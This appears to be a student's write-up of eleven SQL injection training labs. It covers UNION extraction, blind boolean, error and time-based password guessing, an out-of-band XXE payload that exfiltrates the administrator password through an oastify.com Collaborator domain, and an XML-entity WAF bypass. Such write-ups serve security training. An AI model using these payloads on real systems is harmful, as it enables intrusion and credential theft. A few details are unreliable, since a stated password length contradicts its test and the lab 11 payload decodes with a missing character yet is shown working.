### SQL Injection



**1) SQL injection vulnerability in WHERE clause allowing retrieval of hidden data**



In this lab there was a problem in

          SELECT * FROM products WHERE category = 'Gifts' AND released = 1

Intercept the request and add "'+OR+1=1--" into the category to get the result





**2) SQL injection UNION attack, determining the number of columns returned by the query**



Here we are trying to find the number of columns using the category filter. We can find that by add the query

          'UNION+SELECT+NULL,NULL--

NULL should be added until we get an output other than error. The number of "NULL" we use is the number of columns in the table.





**3) SQL injection UNION attack, retrieving data from other tables**



It is mentioned that there exist a table called users which has 2 columns, username and password. So there are 2 columns. Hence we use

          'UNION+SELECT+username,+password+FROM+users--

We get 3 users and there password as well.





**4) Blind SQL injection with conditional responses**



It is mentioned that conditional responses. Using Burp we that in cookie there is a TrackingId and it can be used to identify when the condition is true. When condition is true we won't get result but will get a "Welcome back" text along with the normal site.

          ' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>19)='a

we find the password length is 20.

          ' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a

Here within the intruder we mark the first 1 for position giving payload 1-20 and 'a' wit payload a-z while using Grep-Match with Welcome back and ran a Cluster bomb attack.





**5) Blind SQL injection with conditional errors**



Here we have identified that we can make the system throw an error when we get our condition true. Meaning using the TrackingId we can do an SQL Injection with the condition when we get True condition it throws a 500 Internal Error.

        (SELECT CASE WHEN (condition) THEN TO_CHAR(1/0) ELSE '' END FROM dual)

we use 1/0 if the we get true and hence throwing an error.

        '||(SELECT CASE WHEN (LENGTH(password)>19) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

We find the table exists with username and password, find password length is 19

        '||(SELECT CASE WHEN (SUBSTR(password,1,1)='a') THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'

We select both 'a' and '1' to where payloads are added. Run it and sort it according to the Internal error 500 and we get the password to enter as the administrator.





**6) Visible error-based SQL injection**



In this lab the database errors are placed directly in the application's HTTP response, hence we are going to generate error by making any output we get into an integer to successfully get the password of admin.

        ' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--

there is a limiting function so we remove the tracking id entirely and add the sql.





**7) Blind SQL injection with time delays**



The objective here is to cause a delay in the site which can be done by adding the below to the trackingid.

         '||pg_sleep(10)--





**8) Blind SQL injection with time delays and information retrieval**



With the help of time delay as a condition we get the password of the admin using the below

         '%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,§1§,1)='§a§')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END+FROM+users--

with the help of intruder we do a cluster bomb attack on 1 and a sort it and we get the password.





**9) Blind SQL injection with out-of-band interaction**



Here the application does not return any data or time delays directly in the response. So we trigger an out-of-band DNS lookup using Burp Collaborator to confirm the database executes our SQL query. We inject an XXE payload inside the TrackingId cookie using Oracle's XML functions to force a DNS request back to our Collaborator domain.

         x' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://8v41du7fqwc0rdzzr11uu5zbu20tokc9.oastify.com/"> %remote;]>'),'/l') FROM dual--

Checking Burp Collaborator we receive the DNS lookup proving the injection is successful.





**10) Blind SQL injection with out-of-band data exfiltration**



In this lab we take the out-of-band technique further to exfiltrate the admin password. Using string concatenation in Oracle, we append the result of the query selecting the administrator password as a subdomain prefix to our Burp Collaborator address.

         '+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a%2f%2f'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.sxtlfe9zsgektx1jtl3ewp1vwm2dq5eu.oastify.com%2f">+%25remote%3b]>'),'/l')+FROM+dual--

Output: The Collaborator server received a DNS lookup of type AAAA for the domain name wsq4440fyn4lvivker0l.sxtlfe9zsgektx1jtl3ewp1vwm2dq5eu.oastify.com. The lookup was received from IP address 34.245.82.53:16330 at 2026-Sep-21 07:22:01.863 UTC.

From the DNS subdomain prefix we get the administrator password: wsq4440fyn4lvivker0l





**11) SQL injection with filter bypass via XML encoding**



Here the application passes data inside XML format in a POST request, but a WAF blocks SQL keywords like UNION. Since the XML parser decodes entities after WAF evaluation, we bypass the filter by hex encoding the SQL query into XML entities inside the storeId tag.

<?xml version="1.0" encoding="UTF-8"?>
<store>
    <productId>1</productId>
    <storeId>1 &#x55;&#x4e;&#x49;&#x4f;&#x4e;&#x20;&#x53;&#x45;&#x4c;&#x45;&#x43;&#x54;&#x20;&#x75;&#x73;&#x65;&#x72;&#x6e;&#x61;&#x6d;&#x65;&#x20;&#x7c;&#x7c;&#x20;&#x27;&#x7e;&#x27;&#x20;&#x7c;&#x7c;&#x20;&#x70;&#x61;&#x73;&#x73;&#x77;&#x6f;&#x72;&#x46;&#x52;&#x4f;&#x4d;&#x20;&#x75;&#x73;&#x65;&#x72;&#x73;</storeId>
</store>

Output: 
administrator~zirmns8uagl646xf3lgz
775 units
carlos~at8osf6o35twg46d9ga9
wiener~jdnl42s8vs4brl3ae2vg
